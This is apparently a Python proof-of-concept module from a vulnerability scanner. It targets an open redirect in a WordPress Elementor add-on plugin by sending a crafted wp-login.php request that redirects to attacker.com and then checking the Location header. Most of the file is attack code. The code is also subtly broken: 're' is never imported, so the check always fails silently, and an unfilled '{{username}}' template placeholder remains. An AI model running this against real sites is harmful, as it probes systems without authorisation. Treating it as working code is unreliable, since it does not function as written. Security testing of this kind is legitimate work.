import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''The Plus Addons for Elementor Page Builder < 4.1.10 - Open Redirect''',
        "description": '''The plugin did not validate a redirect parameter on a specifically crafted URL before redirecting the user to it, leading to an Open Redirect issue.''',
        "severity": "medium",
        "references": [
            "https://wpscan.com/vulnerability/fd4352ad-dae0-4404-94d1-11083cb1f44d"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "redirect", "wp-plugin", "elementor", "wp"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/?author=1"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-login.php?action=theplusrp&key=&redirecturl=http://attacker.com&forgoturl=http://attacker.com&login={{username}}"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)attacker\.com\/?(\/|[^.].*)?$""",str(resp1.headers))):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url